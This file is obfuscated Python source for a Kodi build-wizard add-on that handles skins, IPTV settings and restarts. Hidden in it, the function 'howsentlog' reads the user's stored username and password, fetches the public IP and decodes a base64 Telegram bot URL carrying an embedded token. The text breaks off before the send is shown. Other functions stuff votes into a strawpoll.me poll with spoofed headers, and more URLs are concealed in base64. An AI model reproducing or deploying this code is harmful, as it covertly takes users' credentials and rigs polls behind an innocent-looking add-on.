# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	O000O00OO0OOO0OO0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	O00000OO0OO0O0O0O =[];OO0OO0O00OOOO0000 =[]#line:267
	for O000OO0OOO0O0OO0O in sorted (O000O00OO0OOO0OO0 ,key =lambda OOOO0O0OOOOO00000 :OOOO0O0OOOOO00000 ):#line:268
		OOOO0O0OO000000O0 =os .path .split (O000OO0OOO0O0OO0O [:-1 ])[1 ]#line:269
		O0OOO000OO000OO00 =os .path .join (O000OO0OOO0O0OO0O ,'addon.xml')#line:270
		if os .path .exists (O0OOO000OO000OO00 ):#line:271
			OOO00000000000000 =open (O0OOO000OO000OO00 )#line:272
			O00O0OOOOO00OO00O =OOO00000000000000 .read ()#line:273
			OOOO0O00OO0OO00O0 =parseDOM2 (O00O0OOOOO00OO00O ,'addon',ret ='id')#line:274
			OO00000OO0O000O00 =OOOO0O0OO000000O0 if len (OOOO0O00OO0OO00O0 )==0 else OOOO0O00OO0OO00O0 [0 ]#line:275
			try :#line:276
				OO0OOO0O000OOO0O0 =xbmcaddon .Addon (id =OO00000OO0O000O00 )#line:277
				O00000OO0OO0O0O0O .append (OO0OOO0O000OOO0O0 .getAddonInfo ('name'))#line:278
				OO0OO0O00OOOO0000 .append (OO00000OO0O000O00 )#line:279
			except :#line:280
				pass #line:281
	O00O0OOO0OO0OOO00 =[];OOOO0OOO00OOO00OO =0 #line:282
	O0OO00O000OOO0OOO =["Current Skin -- %s"%currSkin ()]+O00000OO0OO0O0O0O #line:283
	OOOO0OOO00OOO00OO =DIALOG .select ("Select the Skin you want to swap with.",O0OO00O000OOO0OOO )#line:284
	if OOOO0OOO00OOO00OO ==-1 :return #line:285
	else :#line:286
		O0O0O0OO0OO0O0O00 =(OOOO0OOO00OOO00OO -1 )#line:287
		O00O0OOO0OO0OOO00 .append (O0O0O0OO0OO0O0O00 )#line:288
		O0OO00O000OOO0OOO [OOOO0OOO00OOO00OO ]="%s"%(O00000OO0OO0O0O0O [O0O0O0OO0OO0O0O00 ])#line:289
	if O00O0OOO0OO0OOO00 ==None :return #line:290
	for O00000OOOOO0O0000 in O00O0OOO0OO0OOO00 :#line:291
		swapSkins (OO0OO0O00OOOO0000 [O00000OOOOO0O0000 ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O00O000OO000OOOOO ,title ="Error"):#line:296
	OOOOO00OOO0OO000O ='lookandfeel.skin'#line:297
	OO00000OOOO0O00O0 =O00O000OO000OOOOO #line:298
	O000O00OOO00OOO0O =getOld (OOOOO00OOO0OO000O )#line:299
	OOO0OO0OOOOOOOO00 =OOOOO00OOO0OO000O #line:300
	setNew (OOO0OO0OOOOOOOO00 ,OO00000OOOO0O00O0 )#line:301
	O00OO0OO0O0O0000O =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO0OO0O0O0000O <100 :#line:303
		O00OO0OO0O0O0000O +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (OOO0OOO0O0O000OO0 ):#line:310
	try :#line:311
		OOO0OOO0O0O000OO0 ='"%s"'%OOO0OOO0O0O000OO0 #line:312
		O00OOOOO0O000OOOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO0OOO0O0O000OO0 )#line:313
		O0O0OOO0O0000O0OO =xbmc .executeJSONRPC (O00OOOOO0O000OOOO )#line:315
		O0O0OOO0O0000O0OO =simplejson .loads (O0O0OOO0O0000O0OO )#line:316
		if O0O0OOO0O0000O0OO .has_key ('result'):#line:317
			if O0O0OOO0O0000O0OO ['result'].has_key ('value'):#line:318
				return O0O0OOO0O0000O0OO ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OO0OOO0OOOO0OOO00 ,O00OOOO000OO00OOO ):#line:325
	try :#line:326
		OO0OOO0OOOO0OOO00 ='"%s"'%OO0OOO0OOOO0OOO00 #line:327
		O00OOOO000OO00OOO ='"%s"'%O00OOOO000OO00OOO #line:328
		OO00O0OOO0O000OO0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0OOO0OOOO0OOO00 ,O00OOOO000OO00OOO )#line:329
		OOO00O000000O000O =xbmc .executeJSONRPC (OO00O0OOO0O000OO0 )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			O0OO00OO0OOO0O00O =xbmcgui .DialogProgress ()#line:340
			O0OO00OO0OOO0O00O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			O0OO00OO0OOO0O00O .update (0 )#line:344
			for O0O000OO000OOO0OO in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				O0OO00OO0OOO0O00O .update (int ((5 -O0O000OO000OOO0OO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0O000OO000OOO0OO ),'')#line:347
				if O0OO00OO0OOO0O00O .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			O0OO00OO0OOO0O00O =xbmcgui .DialogProgress ()#line:353
			O0OO00OO0OOO0O00O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			O0OO00OO0OOO0O00O .update (0 )#line:357
			for O0O000OO000OOO0OO in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				O0OO00OO0OOO0O00O .update (int ((5 -O0O000OO000OOO0OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0O000OO000OOO0OO ),'')#line:360
				if O0OO00OO0OOO0O00O .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O0O0OO0O0000OO00O ='18773068'#line:373
    O0O0O00000000O00O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OO0O0000OO00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O0O0OOO0O000OO00O ='145273320'#line:387
    O000000O000O0OO00 ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O00O00000OO00OOO0 =O0O0OOO0O000OO00O #line:390
    else :#line:391
        O00O00000OO00OOO0 =O000000O000O0OO00 #line:392
    O0O0OO00000O00000 ={'options':O00O00000OO00OOO0 }#line:396
    OOO0O00O00O0OO00O =requests .post ('https://www.strawpoll.me/'+O0O0OO0O0000OO00O ,headers =O0O0O00000000O00O ,data =O0O0OO00000O00000 )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        O0O0OOO00OO000O0O ='18773068'#line:402
        O0O00000OO00000O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OOO00OO000O0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O000O000OOOO0O0O0 ='145273320'#line:416
        O0000OO00OO00000O ={'options':O000O000OOOO0O0O0 }#line:422
        OOOO000O0O00OO0O0 =requests .post ('https://www.strawpoll.me/'+O0O0OOO00OO000O0O ,headers =O0O00000OO00000O0 ,data =O0000OO00OO00000O )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O0OOO00OO0OO0O000 ='18773068'#line:429
        O00OO0OOOO00OOOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOO00OO0OO0O000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OO0OOOO0OO0000000 ='145273321'#line:443
        O0O0000OOO0O0O0OO ={'options':OO0OOOO0OO0000000 }#line:449
        OO0OO00OOO00OOO0O =requests .post ('https://www.strawpoll.me/'+O0OOO00OO0OO0O000 ,headers =O00OO0OOOO00OOOO0 ,data =O0O0000OOO0O0O0OO )#line:451
   except :pass #line:452
def testcommand ():#line:456
	infobuild ()#line:457
def skin_homeselect ():#line:458
	try :#line:460
		O0OOOO0OO00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:461
		O0O0OO0O00000000O =open (O0OOOO0OO00O0O0O0 ,'r')#line:463
		O0O0OO0000O00O0OO =O0O0OO0O00000000O .read ()#line:464
		O0O0OO0O00000000O .close ()#line:465
		OOOO0O00OO0000O00 ='<setting id="HomeS" type="string(.+?)/setting>'#line:466
		OO0O0O00O0OOOOO00 =re .compile (OOOO0O00OO0000O00 ).findall (O0O0OO0000O00O0OO )[0 ]#line:467
		O0O0OO0O00000000O =open (O0OOOO0OO00O0O0O0 ,'w')#line:468
		O0O0OO0O00000000O .write (O0O0OO0000O00O0OO .replace ('<setting id="HomeS" type="string%s/setting>'%OO0O0O00O0OOOOO00 ,'<setting id="HomeS" type="string"></setting>'))#line:469
		O0O0OO0O00000000O .close ()#line:470
	except :#line:471
		pass #line:472
def autotrakt ():#line:475
    O00OO0000O00O0O00 =(ADDON .getSetting ("auto_trk"))#line:476
    if O00OO0000O00O0O00 =='true':#line:477
       from resources .libs import trk_aut #line:478
def traktsync ():#line:480
     OO0OO0OO00OOO000O =(ADDON .getSetting ("auto_trk"))#line:481
     if OO0OO0OO00OOO000O =='true':#line:482
       from resources .libs import trk_aut #line:485
     else :#line:486
        ADDON .openSettings ()#line:487
def imdb_synck ():#line:489
   try :#line:490
     OOOOOOO0OO000O0O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:491
     O00OOO0OOO0000O0O =xbmcaddon .Addon ('plugin.video.gaia')#line:492
     O00OOOO00O00O00O0 =(ADDON .getSetting ("imdb_sync"))#line:493
     O00OOO0O0OO0O00O0 ="imdb.user"#line:494
     O0OOOO000O000OOOO ="accounts.informants.imdb.user"#line:495
     OOOOOOO0OO000O0O0 .setSetting (O00OOO0O0OO0O00O0 ,str (O00OOOO00O00O00O0 ))#line:496
     O00OOO0OOO0000O0O .setSetting ('accounts.informants.imdb.enabled','true')#line:497
     O00OOO0OOO0000O0O .setSetting (O0OOOO000O000OOOO ,str (O00OOOO00O00O00O0 ))#line:498
   except :pass #line:499
def dis_or_enable_addon (OO0000OOO0O0O0O0O ,OO00OOO0O00OOOOO0 ,enable ="true"):#line:501
    import json #line:502
    O0OO0000OOOO0O000 ='"%s"'%OO0000OOO0O0O0O0O #line:503
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0000OOO0O0O0O0O )and enable =="true":#line:504
        logging .warning ('already Enabled')#line:505
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0000OOO0O0O0O0O )#line:506
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0000OOO0O0O0O0O )and enable =="false":#line:507
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0000OOO0O0O0O0O )#line:508
    else :#line:509
        OOOOO0000OO0OOO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0OO0000OOOO0O000 ,enable )#line:510
        OOOOOO0OO0O000O00 =xbmc .executeJSONRPC (OOOOO0000OO0OOO00 )#line:511
        O000OO0O0OO000OOO =json .loads (OOOOOO0OO0O000O00 )#line:512
        if enable =="true":#line:513
            xbmc .log ("### Enabled %s, response = %s"%(OO0000OOO0O0O0O0O ,O000OO0O0OO000OOO ))#line:514
        else :#line:515
            xbmc .log ("### Disabled %s, response = %s"%(OO0000OOO0O0O0O0O ,O000OO0O0OO000OOO ))#line:516
    if OO00OOO0O00OOOOO0 =='auto':#line:517
     return True #line:518
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:519
def iptvset ():#line:522
  try :#line:523
    O0OO00O0O00O00OOO =(ADDON .getSetting ("iptv_on"))#line:524
    if O0OO00O0O00O00OOO =='true':#line:526
       if KODIV >=17 and KODIV <18 :#line:528
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:529
         O0OOO0O000OOOOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:530
         OO00O0O00O00O0OOO =(ADDON .getSetting ("iptvUrl"))#line:532
         O0OOO0O000OOOOO0O .setSetting ('m3uUrl',OO00O0O00O00O0OOO )#line:533
         O000OOO000OOOO00O =(ADDON .getSetting ("epg_Url"))#line:534
         O0OOO0O000OOOOO0O .setSetting ('epgUrl',O000OOO000OOOO00O )#line:535
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:538
         iptvsimpldownpc ()#line:539
         wiz .kodi17Fix ()#line:540
         xbmc .sleep (1000 )#line:541
         O0OOO0O000OOOOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:542
         OO00O0O00O00O0OOO =(ADDON .getSetting ("iptvUrl"))#line:543
         O0OOO0O000OOOOO0O .setSetting ('m3uUrl',OO00O0O00O00O0OOO )#line:544
         O000OOO000OOOO00O =(ADDON .getSetting ("epg_Url"))#line:545
         O0OOO0O000OOOOO0O .setSetting ('epgUrl',O000OOO000OOOO00O )#line:546
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:548
         iptvsimpldown ()#line:549
         wiz .kodi17Fix ()#line:550
         xbmc .sleep (1000 )#line:551
         O0OOO0O000OOOOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:552
         OO00O0O00O00O0OOO =(ADDON .getSetting ("iptvUrl"))#line:553
         O0OOO0O000OOOOO0O .setSetting ('m3uUrl',OO00O0O00O00O0OOO )#line:554
         O000OOO000OOOO00O =(ADDON .getSetting ("epg_Url"))#line:555
         O0OOO0O000OOOOO0O .setSetting ('epgUrl',O000OOO000OOOO00O )#line:556
  except :pass #line:557
def howsentlog ():#line:564
       try :#line:565
          import json #line:566
          OO0OO0000000OO0OO =(ADDON .getSetting ("user"))#line:567
          O000O0O000OO0O000 =(ADDON .getSetting ("pass"))#line:568
          OOO0O0O0O0O00O00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:569
          O0OO0O0O0O0000O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:571
          OO0O000OOO0000OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:572
          O0O0OOOOOO0000OOO =str (json .loads (OO0O000OOO0000OO0 )['ip'])#line:573
          OOOO0OOO0O00O0000 =OO0OO0000000OO0OO #line:574
          O0O0OO000O0000OOO =O000O0O000OO0O000 #line:575
          import socket #line:577
